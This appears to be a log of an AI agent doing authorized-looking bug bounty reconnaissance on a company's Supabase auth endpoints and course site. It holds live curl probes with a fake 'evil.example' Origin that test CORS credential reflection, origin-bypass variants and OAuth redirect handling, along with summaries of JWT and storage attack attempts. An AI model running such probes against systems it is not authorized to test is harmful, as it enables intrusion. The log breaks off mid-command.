@@ -34838,3 +34838,1163 @@ cf-ray: a462ad1acdb83210-IAD
 ---BODY---
 {"code":400,"error_code":"validation_failed","msg":"Verify requires a verification type"}
 [0m
+===== ANALYST bigpickle 2026-10-06 13:57:56 UTC =====
+[0m
+> build · big-pickle
+[0m
+[0m$ [0mPUB="sb_publishable_g48Bd8qEtLesgk0zgzTRig_eZ6j9w30"
+for t in signup invite magiclink recovery email_change email sms phone_change double_factor; do
+  echo "=== type=$t ==="
+  curl -sS -o /tmp/opencode/body.txt -D /tmp/opencode/hdr.txt -m 15 \
+    -H "Origin: https://evil.example" \
+    "https://aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1/verify?type=$t&token=x" 2>&1
+  echo "--- headers ---"
+  grep -iE "^HTTP/|^location:|^access-control|^content-type|^vary" /tmp/opencode/hdr.txt
+  echo "--- body ---"
+  cat /tmp/opencode/body.txt; echo
+  sleep 1.1
+done
+=== type=signup ===
+--- headers ---
+HTTP/2 303 
+content-type: text/plain
+location: https://kurs.onecode.de#error=access_denied&error_code=otp_expired&error_description=Email+link+is+invalid+or+has+expired&sb=
+access-control-allow-origin: https://evil.example
+vary: Origin, Accept-Encoding
+access-control-allow-credentials: true
+access-control-expose-headers: X-Total-Count, Link, X-Supabase-Api-Version
+--- body ---
+<a href="https://kurs.onecode.de#error=access_denied&amp;error_code=otp_expired&amp;error_description=Email+link+is+invalid+or+has+expired&amp;sb=">See Other</a>.
+
+
+=== type=invite ===
+--- headers ---
+HTTP/2 303 
+content-type: text/plain
+location: https://kurs.onecode.de#error=access_denied&error_code=otp_expired&error_description=Email+link+is+invalid+or+has+expired&sb=
+access-control-allow-origin: https://evil.example
+vary: Origin, Accept-Encoding
+access-control-allow-credentials: true
+access-control-expose-headers: X-Total-Count, Link, X-Supabase-Api-Version
+--- body ---
+<a href="https://kurs.onecode.de#error=access_denied&amp;error_code=otp_expired&amp;error_description=Email+link+is+invalid+or+has+expired&amp;sb=">See Other</a>.
+
+
+=== type=magiclink ===
+--- headers ---
+HTTP/2 303 
+content-type: text/plain
+location: https://kurs.onecode.de#error=access_denied&error_code=otp_expired&error_description=Email+link+is+invalid+or+has+expired&sb=
+access-control-allow-origin: https://evil.example
+vary: Origin, Accept-Encoding
+access-control-allow-credentials: true
+access-control-expose-headers: X-Total-Count, Link, X-Supabase-Api-Version
+--- body ---
+<a href="https://kurs.onecode.de#error=access_denied&amp;error_code=otp_expired&amp;error_description=Email+link+is+invalid+or+has+expired&amp;sb=">See Other</a>.
+
+
+=== type=recovery ===
+--- headers ---
+HTTP/2 303 
+content-type: text/plain
+location: https://kurs.onecode.de#error=access_denied&error_code=otp_expired&error_description=Email+link+is+invalid+or+has+expired&sb=
+access-control-allow-origin: https://evil.example
+vary: Origin, Accept-Encoding
+access-control-allow-credentials: true
+access-control-expose-headers: X-Total-Count, Link, X-Supabase-Api-Version
+--- body ---
+<a href="https://kurs.onecode.de#error=access_denied&amp;error_code=otp_expired&amp;error_description=Email+link+is+invalid+or+has+expired&amp;sb=">See Other</a>.
+
+
+=== type=email_change ===
+--- headers ---
+HTTP/2 303 
+content-type: text/plain
+location: https://kurs.onecode.de#error=access_denied&error_code=otp_expired&error_description=Email+link+is+invalid+or+has+expired&sb=
+access-control-allow-origin: https://evil.example
+vary: Origin, Accept-Encoding
+access-control-allow-credentials: true
+access-control-expose-headers: X-Total-Count, Link, X-Supabase-Api-Version
+--- body ---
+<a href="https://kurs.onecode.de#error=access_denied&amp;error_code=otp_expired&amp;error_description=Email+link+is+invalid+or+has+expired&amp;sb=">See Other</a>.
+
+
+=== type=email ===
+--- headers ---
+HTTP/2 303 
+content-type: text/plain
+location: https://kurs.onecode.de#error=access_denied&error_code=otp_expired&error_description=Email+link+is+invalid+or+has+expired&sb=
+access-control-allow-origin: https://evil.example
+vary: Origin, Accept-Encoding
+access-control-allow-credentials: true
+access-control-expose-headers: X-Total-Count, Link, X-Supabase-Api-Version
+--- body ---
+<a href="https://kurs.onecode.de#error=access_denied&amp;error_code=otp_expired&amp;error_description=Email+link+is+invalid+or+has+expired&amp;sb=">See Other</a>.
+
+
+=== type=sms ===
+--- headers ---
+HTTP/2 303 
+content-type: text/plain
+location: https://kurs.onecode.de#error=invalid_request&error_code=validation_failed&error_description=Invalid+email+verification+type&sb=
+access-control-allow-origin: https://evil.example
+vary: Origin, Accept-Encoding
+access-control-allow-credentials: true
+access-control-expose-headers: X-Total-Count, Link, X-Supabase-Api-Version
+--- body ---
+<a href="https://kurs.onecode.de#error=invalid_request&amp;error_code=validation_failed&amp;error_description=Invalid+email+verification+type&amp;sb=">See Other</a>.
+
+
+=== type=phone_change ===
+--- headers ---
+HTTP/2 303 
+content-type: text/plain
+location: https://kurs.onecode.de#error=invalid_request&error_code=validation_failed&error_description=Invalid+email+verification+type&sb=
+access-control-allow-origin: https://evil.example
+vary: Origin, Accept-Encoding
+access-control-allow-credentials: true
+access-control-expose-headers: X-Total-Count, Link, X-Supabase-Api-Version
+--- body ---
+<a href="https://kurs.onecode.de#error=invalid_request&amp;error_code=validation_failed&amp;error_description=Invalid+email+verification+type&amp;sb=">See Other</a>.
+
+
+=== type=double_factor ===
+--- headers ---
+HTTP/2 303 
+content-type: text/plain
+location: https://kurs.onecode.de#error=invalid_request&error_code=validation_failed&error_description=Invalid+email+verification+type&sb=
+access-control-allow-origin: https://evil.example
+vary: Origin, Accept-Encoding
+access-control-allow-credentials: true
+access-control-expose-headers: X-Total-Count, Link, X-Supabase-Api-Version
+--- body ---
+<a href="https://kurs.onecode.de#error=invalid_request&amp;error_code=validation_failed&amp;error_description=Invalid+email+verification+type&amp;sb=">See Other</a>.
+[0m
+## Objective
+- Act as senior bug bounty analyst for OneCode GmbH (report channel: bugs.olivermaicher.eu), running a 7-step hypothesis cycle over in-scope assets (*.onecode.de, kurs.onecode.de, company infra) to find and validate real, reportable vulnerabilities.
+- Output only structured blocks: [PRIO]/[HYP]/[PARKED]/[FINAL]/[NEXT]/[LEARN]/[RISK], passive-first, read-only probes ≤1 rps (GET/HEAD/OPTIONS only).
+
+## Important Details
+- Phase: `POC`, target: `api`; risk score currently 49 (deliberately held).
+- In-scope only: `*.onecode.de`, `kurs.onecode.de`, OneCode-operated infra. Supabase project `aygnpacdkgtsfnhgcyjc` is treated as in-scope cloud surface.
+- Out-of-scope classes list is extensive (enumeration, DoS, TLS/mail best practice, cookie flags, etc.) — never emit those classes.
+- Supabase publishable key: `sb_publishable_g48Bd8qEtLesgk0zgzTRig_eZ6j9w30`; sha256 of key bytes = `43ccb834cf7f4cbce3e9e4f8365b819cc36909350ab1e68173c1a47675ea034a` (the `870cf518…` digest was a trailing-newline artifact; PoCs must cite `43ccb834…`).
+- `kurs.onecode.de` build fingerprints: main chunk `0-mbmp1iqb6hj.js` = 154 581 B sha256 `f916f314ea61a8c58a055707fc63c251f38e8412ae7a08e6abd7500ec375abca`; sink chunk `1a4tqdnsy9k1l.js` = 13 880 B sha256 `5a72d2cd8738ecadfd9ef271f062b3f2ba799617dabddf32987c2883c6dcedd0` (64-hex, never the 66-char variant); `/login` page sha256 `99798c7d94a15abf93ec349b0b221a89dfba756cb21fc581a09d37acd21d9450`, 18 702 B. No deploy since 2026-09-19 11:33Z; build-diffing is event-triggered only.
+- Pre-auth surface on kurs = `{/login, /passwort-vergessen, /datenschutz, /rechtliches}` (200); all `/api/*, /v1, /admin, /dashboard, /courses, /einladung, /passwort-neu` → 307→/login.
+- `HashSessionHandoff` (module 34891) mounted on `/login` RSC payload row 18, no state/nonce/PKCE binding; post-setSession map `{invite:/einladung, recovery:/passwort-neu}` default `/` — forced-login (CWE-384) only, requires valid attacker token pair → PARKED (AUTH_HELPED).
+- GoTrue CORS model: three tiers keyed on route registration — (A) 6 pre-gate Kong routes (`.well-known/jwks.json`, `.well-known/openid-configuration`, `.well-known/oauth-authorization-server` prefix-mounted, `oauth/authorize`, `oauth/token`, `oauth/userinfo`) reflect Origin+ACAC:true keyless; (B) `/auth/v1/*` resource paths reflect+ACAC only when apikey present (header or query), else `ACAO: *` no ACAC; (C) fallthrough → `ACAO: *` + 9-method list + max-age 3600. `/auth/v1/verify` is the 7th pre-gate route (keyless, exactly-matched). Preflight NEVER reflects anywhere. Mechanism = gate ordering (GoTrue apikey gate before routing; Kong routes matched pre-gate).
+- JWT signing is **ES256-only** (JWKS kid `4f59d46f-c3e6-47c7-a717-fabf016650c9`); 38 live probes closed alg confusion + embedded JWK injection; old HS256-secret reasoning was wrong-algorithm.
+- `/auth/v1/settings`: `external.anonymous_users:false`, `disable_signup:true`, `mailer_autoconfirm:false`, email-only, `saml_enabled:false` but `saml_private_key_next_configured:true`, `passkeys_enabled:false`. No allowlist enumeration in settings body.
+- `redirect_to` allowlist: 15 off-origin shapes across 4 verify types + 2 token encodings, zero bypass; `X-Forwarded-Host` does not influence it; SITE_URL = `https://kurs.onecode.de`.
+- Storage: pre-auth bucket-existence oracle route-table-complete across 10 mounted GET classes (byte-identical `400 {"code":"NoSuchBucket"}`), 81 names excluded, bucket name unrecoverable from 13 pre-auth chunks; `/object/upload/sign/{b}/{k}` mounted (POST outside read-only bounds). S3 plane (`aygnpacdkgtsfnhgcyjc.storage.supabase.co/storage/v1/s3`) = SigV4-enforced, 403 Missing signature, no oracle, untestable without owner keys → PARKED (was wrongly emitted `[FINAL] conf 75 PASSIVE HIGH` with empty verify_steps).
+- `cto.onecode.de`: CNAME→`cname.perspective-dns.com` (104.18.2.73/104.18.3.73), HTTP 409 "error code:1001", zero verification TXT, day-58+ → conf 58, HUMAN_ONLY.
+- REST monitor `/rest/v1/` formally closed 09-17 (27 probes 503↔401, never 200+rows).
+- Methodological rule: any scope claim must carry its own negative control (counter-example path); re-derive every hash live with 64-hex assertion before recording.
+- Ranked lead from another agent: `[75] aygnpacdkgtsfnhgcyjc.storage.supabase.co/storage/v1/s3` (already downgraded by self-correction to PARKED/untestable).
+
+## Work State
+### Completed
+- 53+ days of cycles; pre-auth surface of kurs fully characterized and exhausted.
+- Closed/rejected: XSS on `/login` (enum + server allowlist), `_next/image` SSRF, CVE-2025-29927 middleware bypass, path-normalization/header-desync bypasses, forged-cookie bypasses, PKCE injection, open redirect (GoTrue 15 shapes + HashSessionHandoff next-map), JWT alg/key confusion + embedded JWK (38 probes), HS256 secret forgery, storage bucket-name recovery, SSO assertion injection, host-header redirect influence, CORS cache amplification, `/auth/v1/anonymous`, PostgREST schema/GraphQL disclosure, analytics plane.
+- Established [FINAL] conf ≥40 PASSIVE findings: (1) pre-auth token-state oracle on `/auth/v1/verify` conf 71; (2) route-registration-ordered CORS/auth gate conf 69 (LOW-MEDIUM); (3) storage bucket-existence oracle conf 62 (LOW).
+
+### Active
+- Queued NEXT probe (from last lead): enumerate verification-type surface on `/auth/v1/verify` — read-only GETs with `token=x` and types `{signup,invite,magiclink,recovery,email_change,email,sms,phone_change,double_factor}` plus Origin header, to test whether parameter validation is separable from token lookup (distinct error_code per type before token verification).
+- New standing hypotheses: CORS reflection on `/verify` unconditional across both response branches; verification-type enumeration disclosing configured OTP channels.
+
+### Blocked
+- Post-auth BOLA/RLS (conf 65): needs 2 invited test accounts → AUTH_HELPED.
+- `cto.onecode.de` takeover (conf 58): needs owner claim attempt → HUMAN_ONLY.
+- S3 plane differential: needs owner-supplied SigV4 keys → PARKED.
+- HashSessionHandoff forced-login: needs valid token pair + victim interaction → AUTH_HELPED.
+
+## Next Move
+1. Execute the queued [NEXT] PROBE: `GET https://aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1/verify?token=x&type=<T>` for each type in the list, with `Origin: https://evil.example`, ≤1 rps; compare `error_code`/`Location` across types to test parameter-validation separation; confirm reflection+ACAC:true on each.
+2. If no distinct type-dependent errors, park the verify-oracle hypothesis and re-check whether any 8th pre-gate route or tier-boundary counter-example exists.
+
+## Relevant Files
+- `inventory/onecode.md`: 10-host inventory, recon/scan history, per-cycle probe log.
+- Knowledge base (inline): ACCEPTED/REJECTED/NO_DELTA ledger — authoritative for all verdicts and self-corrections.
+- `art/lead_bigpickle.txt`, `art/lead_nemotron3.txt`: competing lead sources (nemotron3 supplies the conf-75 S3 ranked lead and a curl verify probe).
+- `hypotheses-nemotron3.txt`: contains queued `[NEXT]` curl for `/auth/v1/settings` CORS re-verification.
+Continue if you have next steps, or stop and ask for clarification if you are unsure how to proceed.
+[0m$ [0mPUB="sb_publishable_g48Bd8qEtLesgk0zgzTRig_eZ6j9w30"
+run() { echo "=== $1 ==="; shift; curl -sS -o /tmp/opencode/b.txt -D /tmp/opencode/h.txt -m 15 -H "Origin: https://evil.example" "$@"; grep -iE "^HTTP/|^location:|^access-control-allow-origin|^access-control-allow-credentials" /tmp/opencode/h.txt; echo; sleep 1.1; }
+run "control: bogus type" "https://aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1/verify?type=foobar&token=x"
+run "control: no type" "https://aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1/verify?token=x"
+run "control: no token" "https://aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1/verify?type=signup"
+run "control: type case" "https://aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1/verify?type=SIGNUP&token=x"
+=== control: bogus type ===
+HTTP/2 303 
+location: https://kurs.onecode.de#error=invalid_request&error_code=validation_failed&error_description=Invalid+email+verification+type&sb=
+access-control-allow-origin: https://evil.example
+access-control-allow-credentials: true
+
+=== control: no type ===
+HTTP/2 400 
+access-control-allow-origin: https://evil.example
+access-control-allow-credentials: true
+
+=== control: no token ===
+HTTP/2 400 
+access-control-allow-origin: https://evil.example
+access-control-allow-credentials: true
+
+=== control: type case ===
+HTTP/2 303 
+location: https://kurs.onecode.de#error=invalid_request&error_code=validation_failed&error_description=Invalid+email+verification+type&sb=
+access-control-allow-origin: https://evil.example
+access-control-allow-credentials: true
+[0m
+[0m$ [0mV="https://aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1/verify?type=signup&token=x"
+run() { echo "=== $1 ==="; shift; curl -sS -o /tmp/opencode/b.txt -D /tmp/opencode/h.txt -m 15 "$@"; grep -iE "^HTTP/|^location:|^access-control-allow-origin|^access-control-allow-credentials" /tmp/opencode/h.txt; echo; sleep 1.1; }
+run "Origin: null" -H "Origin: null" "$V"
+run "Origin: http://kurs.onecode.de" -H "Origin: http://kurs.onecode.de" "$V"
+run "Origin: suffix evil kurs.onecode.de.evil.com" -H "Origin: https://kurs.onecode.de.evil.com" "$V"
+run "Origin: subdomain kurs.onecode.de" -H "Origin: https://x.kurs.onecode.de" "$V"
+run "Origin: bare host no scheme" -H "Origin: kurs.onecode.de" "$V"
+run "Origin: multiline/injected" -H "Origin: https://evil.example https://evil2.example" "$V"
+=== Origin: null ===
+HTTP/2 303 
+location: https://kurs.onecode.de#error=access_denied&error_code=otp_expired&error_description=Email+link+is+invalid+or+has+expired&sb=
+access-control-allow-origin: null
+access-control-allow-credentials: true
+
+=== Origin: http://kurs.onecode.de ===
+HTTP/2 303 
+location: https://kurs.onecode.de#error=access_denied&error_code=otp_expired&error_description=Email+link+is+invalid+or+has+expired&sb=
+access-control-allow-origin: http://kurs.onecode.de
+access-control-allow-credentials: true
+
+=== Origin: suffix evil kurs.onecode.de.evil.com ===
+HTTP/2 303 
+location: https://kurs.onecode.de#error=access_denied&error_code=otp_expired&error_description=Email+link+is+invalid+or+has+expired&sb=
+access-control-allow-origin: https://kurs.onecode.de.evil.com
+access-control-allow-credentials: true
+
+=== Origin: subdomain kurs.onecode.de ===
+HTTP/2 303 
+location: https://kurs.onecode.de#error=access_denied&error_code=otp_expired&error_description=Email+link+is+invalid+or+has+expired&sb=
+access-control-allow-origin: https://x.kurs.onecode.de
+access-control-allow-credentials: true
+
+=== Origin: bare host no scheme ===
+HTTP/2 303 
+location: https://kurs.onecode.de#error=access_denied&error_code=otp_expired&error_description=Email+link+is+invalid+or+has+expired&sb=
+access-control-allow-origin: kurs.onecode.de
+access-control-allow-credentials: true
+
+=== Origin: multiline/injected ===
+HTTP/2 303 
+location: https://kurs.onecode.de#error=access_denied&error_code=otp_expired&error_description=Email+link+is+invalid+or+has+expired&sb=
+access-control-allow-origin: https://evil.example https://evil2.example
+access-control-allow-credentials: true
+[0m
+[0m$ [0mls -la inventory/ 2>/dev/null; echo "---"; tail -30 inventory/onecode.md 2>/dev/null
+total 176
+drwxr-xr-x  2 runner runner   4096 Oct  6 13:37 .
+drwxr-xr-x 12 runner runner   4096 Oct  6 13:37 ..
+-rw-r--r--  1 runner runner 169538 Oct  6 13:37 onecode.md
+---
+- CHANGED cto.onecode.de — CNAME→cname.perspective-dns.com day-58+, HTTP 409, zero verification TXT; passive probing fully converged, HUMAN_ONLY claim path
+- CHANGED aygnpacdkgtsfnhgcyjc.supabase.co/rest/v1 — monitor formally closed 09-17 (27 probes 503↔401, never 200+rows); platform enforces sb_publishable_ format only
+- CHANGED GoTrue CORS model corrected to three tiers keyed on route registration: (A) well-known + OAuth-router paths reflect unconditionally with ACAC:true; (B) /auth/v1/* resource paths reflect with ACAC:true
+- CHANGED Preflight uniformly ACAO:* with full destructive method list on all planes — does NOT reflect Origin anywhere
+
+## 2026-10-05 09:20:54 UTC
+- NEW `aygnpacdkgtsfnhgcyjc.storage.supabase.co/storage/v1/s3` — S3-compatible storage plane confirmed live (403 Missing signature), independent SigV4 authz plane never probed in 26 days; access-key-ID orac
+- NEW `aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1/verify` — confirmed as 7th pre-gate route (keyless, reflects Origin with ACAC:true); open-redirect branch closed by measurement (off-origin redirect_to discar
+- NEW `aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1/.well-known` — namespace has no wildcard route; 5 standards siblings (oauth-protected-resource, /, webfinger, assetlinks.json, change-password) all return key
+- NEW `aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1/sso` — namespace blocked by saml_provider_disabled (not feature_disabled); SAML signing material already provisioned (saml_private_key_next_configured=true) w
+- CHANGED `kurs.onecode.de` — no deploy day-20; main chunk f916f314ea61a8c5... byte-identical since 2026-09-19 11:33Z; pre-auth surface frozen at {/login,/passwort-vergessen,/datenschutz,/rechtliches} 200
+- CHANGED `cto.onecode.de` — CNAME→cname.perspective-dns.com day-58+, HTTP 409, zero verification TXT; passive probing fully converged, HUMAN_ONLY claim path
+- CHANGED `aygnpacdkgtsfnhgcyjc.supabase.co/rest/v1` — monitor formally closed 09-17 (27 probes 503↔401, never 200+rows); platform enforces sb_publishable_ format only
+- CHANGED GoTrue CORS model corrected to three tiers keyed on route registration: (A) well-known + OAuth-router paths reflect unconditionally with ACAC:true; (B) /auth/v1/* resource paths reflect with ACAC:true
+- CHANGED Preflight uniformly ACAO:* with full destructive method list on all planes — does NOT reflect Origin anywhere
+
+## 2026-10-05 18:40:58 UTC
+
+## 2026-10-06 00:21:25 UTC
+- NEW `aygnpacdkgtsfnhgcyjc.storage.supabase.co/storage/v1/s3` — S3-compatible storage plane confirmed live (403 Missing signature), independent SigV4 authz plane never probed in 26 days; access-key-ID orac
+- NEW `aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1/verify` — confirmed as 7th pre-gate route (keyless, reflects Origin with ACAC:true); open-redirect branch closed by measurement (off-origin redirect_to discar
+- NEW `aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1/.well-known` — namespace has no wildcard route; 5 standards siblings (oauth-protected-resource, /, webfinger, assetlinks.json, change-password) all return key
+- NEW `aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1/sso` — namespace blocked by saml_provider_disabled (not feature_disabled); SAML signing material already provisioned (saml_private_key_next_configured=true) w
+- CHANGED `kurs.onecode.de` — no deploy day-20; main chunk f916f314ea61a8c5... byte-identical since 2026-09-19 11:33Z; pre-auth surface frozen at {/login,/passwort-vergessen,/datenschutz,/rechtliches} 200
+- CHANGED `cto.onecode.de` — CNAME→cname.perspective-dns.com day-58+, HTTP 409, zero verification TXT; passive probing fully converged, HUMAN_ONLY claim path
+- CHANGED `aygnpacdkgtsfnhgcyjc.supabase.co/rest/v1` — monitor formally closed 09-17 (27 probes 503↔401, never 200+rows); platform enforces sb_publishable_ format only
+- CHANGED GoTrue CORS model corrected to three tiers keyed on route registration: (A) well-known + OAuth-router paths reflect unconditionally with ACAC:true; (B) /auth/v1/* resource paths reflect with ACAC:true
+- CHANGED Preflight uniformly ACAO:* with full destructive method list on all planes — does NOT reflect Origin anywhere
+
+## 2026-10-06 06:40:53 UTC
+[0m
+[0m$ [0mA="https://aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1/oauth/authorize"
+run() { echo "=== $1 ==="; shift; curl -sS -o /tmp/opencode/b.txt -D /tmp/opencode/h.txt -m 15 -H "Origin: https://evil.example" "$@"; grep -iE "^HTTP/|^location:|^access-control-allow-origin|^access-control-allow-credentials" /tmp/opencode/h.txt; echo "--- body(200) ---"; head -c 300 /tmp/opencode/b.txt; echo; echo; sleep 1.1; }
+run "no client_id" "$A"
+run "pkce client, evil redirect" "$A?client_id=aygnpacdkgtsfnhgcyjc&redirect_uri=https://evil.example/cb&response_type=code&scope=openid"
+run "pkce client, subdomain redirect" "$A?client_id=aygnpacdkgtsfnhgcyjc&redirect_uri=https://evil.kurs.onecode.de/cb&response_type=code"
+run "pkce client, no redirect" "$A?client_id=aygnpacdkgtsfnhgcyjc&response_type=code"
+run "unknown client" "$A?client_id=nonsense&redirect_uri=https://evil.example/cb&response_type=code"
+=== no client_id ===
+HTTP/2 404 
+access-control-allow-origin: https://evil.example
+access-control-allow-credentials: true
+--- body(200) ---
+{"code":404,"error_code":"feature_disabled","msg":"OAuth server is disabled"}
+
+=== pkce client, evil redirect ===
+HTTP/2 404 
+access-control-allow-origin: https://evil.example
+access-control-allow-credentials: true
+--- body(200) ---
+{"code":404,"error_code":"feature_disabled","msg":"OAuth server is disabled"}
+
+=== pkce client, subdomain redirect ===
+HTTP/2 404 
+access-control-allow-origin: https://evil.example
+access-control-allow-credentials: true
+--- body(200) ---
+{"code":404,"error_code":"feature_disabled","msg":"OAuth server is disabled"}
+
+=== pkce client, no redirect ===
+HTTP/2 404 
+access-control-allow-origin: https://evil.example
+access-control-allow-credentials: true
+--- body(200) ---
+{"code":404,"error_code":"feature_disabled","msg":"OAuth server is disabled"}
+
+=== unknown client ===
+HTTP/2 404 
+access-control-allow-origin: https://evil.example
+access-control-allow-credentials: true
+--- body(200) ---
+{"code":404,"error_code":"feature_disabled","msg":"OAuth server is disabled"}
+[0m
+[0m$ [0mB="https://aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1"
+run() { echo "=== $1 ==="; shift; curl -sS -o /tmp/opencode/b.txt -D /tmp/opencode/h.txt -m 15 -H "Origin: https://evil.example" "$@"; grep -iE "^HTTP/|^location:|^access-control-allow-origin|^access-control-allow-credentials" /tmp/opencode/h.txt; echo "--- body ---"; head -c 300 /tmp/opencode/b.txt; echo; echo; sleep 1.1; }
+run "oauth/userinfo keyless" "$B/oauth/userinfo"
+run "oauth/authorize with apikey" -H "apikey: sb_publishable_g48Bd8qEtLesgk0zgzTRig_eZ6j9w30" "$B/oauth/authorize"
+run "well-known oauth-authorization-server" "$B/.well-known/oauth-authorization-server"
+=== oauth/userinfo keyless ===
+HTTP/2 404 
+access-control-allow-origin: https://evil.example
+access-control-allow-credentials: true
+--- body ---
+{"code":404,"error_code":"feature_disabled","msg":"OAuth server is disabled"}
+
+=== oauth/authorize with apikey ===
+HTTP/2 404 
+access-control-allow-origin: https://evil.example
+access-control-allow-credentials: true
+--- body ---
+{"code":404,"error_code":"feature_disabled","msg":"OAuth server is disabled"}
+
+=== well-known oauth-authorization-server ===
+HTTP/2 404 
+access-control-allow-origin: https://evil.example
+access-control-allow-credentials: true
+--- body ---
+{"code":404,"error_code":"feature_disabled","msg":"OAuth server is disabled"}
+[0m
+[0m$ [0mls -la; echo ---; grep -n "NEXT\|PRIO\|HYP" hypotheses-nemotron3.txt 2>/dev/null | tail -30; echo ---; ls art/ 2>/dev/null
+total 988
+drwxr-xr-x 12 runner runner   4096 Oct  6 13:37 .
+drwxr-xr-x  3 runner runner   4096 Oct  6 13:37 ..
+drwxr-xr-x  7 runner runner   4096 Oct  6 13:37 .git
+drwxr-xr-x  3 runner runner   4096 Oct  6 13:37 .github
+-rw-r--r--  1 runner runner   1692 Oct  6 13:37 README.md
+-rw-r--r--  1 runner runner  25062 Oct  6 13:45 analyst-out.txt
+-rw-r--r--  1 runner runner 438633 Oct  6 13:37 analyst-prompt.txt
+-rw-r--r--  1 runner runner 434784 Oct  6 13:37 ctx.txt
+drwxr-xr-x  2 runner runner   4096 Oct  6 13:37 inventory
+drwxr-xr-x  2 runner runner   4096 Oct  6 13:37 knowledge
+drwxr-xr-x  2 runner runner   4096 Oct  6 13:37 leads
+-rw-r--r--  1 runner runner   5887 Oct  6 13:37 probe-results.md
+drwxr-xr-x  2 runner runner   4096 Oct  6 13:37 recon-notes
+drwxr-xr-x  2 runner runner   4096 Oct  6 13:37 reports
+drwxr-xr-x  2 runner runner   4096 Oct  6 13:37 reposcan-raw
+-rw-r--r--  1 runner runner   3268 Oct  6 13:37 scope.yml
+drwxr-xr-x  2 runner runner   4096 Oct  6 13:37 scripts
+-rw-r--r--  1 runner runner     33 Oct  6 13:37 state_bigpickle.json
+-rw-r--r--  1 runner runner     33 Oct  6 13:37 state_laguna.json
+-rw-r--r--  1 runner runner     33 Oct  6 13:37 state_ling3.json
+-rw-r--r--  1 runner runner     33 Oct  6 13:37 state_longcat.json
+-rw-r--r--  1 runner runner     33 Oct  6 13:37 state_mimo.json
+-rw-r--r--  1 runner runner     33 Oct  6 13:37 state_nemotron3.json
+drwxr-xr-x  2 runner runner  12288 Oct  6 13:37 triage
+---
+---
+[0m
+[0m$ [0mls -la leads/ knowledge/ scripts/; echo ---; cat state_bigpickle.json; echo; cat scope.yml | head -60
+knowledge/:
+total 256
+drwxr-xr-x  2 runner runner   4096 Oct  6 13:37 .
+drwxr-xr-x 12 runner runner   4096 Oct  6 13:37 ..
+-rw-r--r--  1 runner runner 250746 Oct  6 13:37 index.md
+
+leads/:
+total 2728
+drwxr-xr-x  2 runner runner    4096 Oct  6 13:37 .
+drwxr-xr-x 12 runner runner    4096 Oct  6 13:37 ..
+-rw-r--r--  1 runner runner 1152939 Oct  6 13:37 lead-bigpickle.md
+-rw-r--r--  1 runner runner   10098 Oct  6 13:37 lead-laguna.md
+-rw-r--r--  1 runner runner    9900 Oct  6 13:37 lead-ling3.md
+-rw-r--r--  1 runner runner   10296 Oct  6 13:37 lead-longcat.md
+-rw-r--r--  1 runner runner      18 Oct  6 13:37 lead-mimo.md
+-rw-r--r--  1 runner runner 1551079 Oct  6 13:37 lead-nemotron3.md
+-rw-r--r--  1 runner runner   34861 Oct  6 13:37 reposcan-onecode.md
+
+scripts/:
+total 28
+drwxr-xr-x  2 runner runner  4096 Oct  6 13:37 .
+drwxr-xr-x 12 runner runner  4096 Oct  6 13:37 ..
+-rw-r--r--  1 runner runner 16987 Oct  6 13:37 sync-issues.py
+---
+{"phase": "POC", "target": "api"}
+programs:
+  onecode:
+    name: OneCode GmbH Bug Bounty
+    disclosure_policy: via bugs.olivermaicher.eu (Oliver Maicher private program) - report + PoC + contact + payment
+    assets:
+      - name: "*.onecode.de, kurs.onecode.de; All company-owned infrastructure, web applications, APIs, development platforms, cloud environments, customer portals, websites, and domains operated by OneCode GmbH"
+        priority: In
+    out_of_scope:
+      - "Network level Denial of Service attacks"
+      - "Application Denial of Service by locking user accounts"
+      - "Descriptive error messages or headers (e.g. Stack Traces, banner grabbing)"
+      - "Disclosure of known public files or directories (e.g. robots.txt)"
+      - "Outdated software / library versions"
+      - "OPTIONS / TRACE HTTP method enabled"
+      - "CSRF on logout"
+      - "CSRF on forms that are available to anonymous users"
+      - "Cookies that lack HTTP Only or Secure settings for non-sensitive data"
+      - "Self-XSS and issues exploitable only through Self-XSS"
+      - "Reports resulting from automated scanning utilities without additional details or a POC demonstrating a specific exploit"
+      - "Attacks requiring physical access to a user's device"
+      - "Attacks dependent upon social engineering of employees or vendors"
+      - "Username enumeration based on login or forgot password pages"
+      - "Enforcement policies for brute force, rate limiting, or account lockout"
+      - "SSL/TLS best practices"
+      - "SSL attacks such as BEAST, BREACH, Renegotiation attack"
+      - "Clickjacking, without additional details demonstrating a specific exploit"
+      - "Mail configuration issues including SPF, DKIM, DMARC settings"
+      - "Use of a known-vulnerable library without a description of an exploit specific to our implementation"
+      - "Password and account recovery policies"
+      - "Presence of autocomplete functionality in form fields"
+      - "Publicly accessible login panels"
+      - "Lack of email address verification during account registration or account invitation"
+      - "Lack of email address verification password restore"
+      - "Session control during email/password changes"
+      - "Social engineering, physical attacks, and DoS/DDoS testing (per program notes)"
+      - "Exposure of customer/employee/financial/authentication data during testing (per program notes)"
+    github_orgs:
+      - none-configured
+
+rules:
+  passive_first: false          # deep-hunt agent: active probes allowed when scoped
+  max_requests_per_second: 1    # never hammer live infra
+  no_doom: true                 # no DoS/DDoS, no account-lockout attacks
+  account_creation: restricted  # only on test/sandbox assets, never live customer data
+  no_data_modification: true    # no writes/deletes on live customer data
+  no_pre_disclosure: true       # never disclose before program response
+  poc_required: true            # scanner output alone is REJECTED
+  redact_secrets_in_commits: true
+
+models:
+  - { id: opencode/big-pickle, name: bigpickle }
+  - { id: opencode/nemotron-3-ultra-free, name: nemotron3 }
+  - { id: opencode/longcat-2.0-free, name: longcat }
+  - { id: opencode/ling-3.0-flash-free, name: ling3 }
+  - { id: opencode/laguna-s-2.1-free, name: laguna }
+[0m
+[0m$ [0mB="https://aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1/.well-known"
+for p in openid-configuration jwks.json; do
+  echo "=== $p ==="
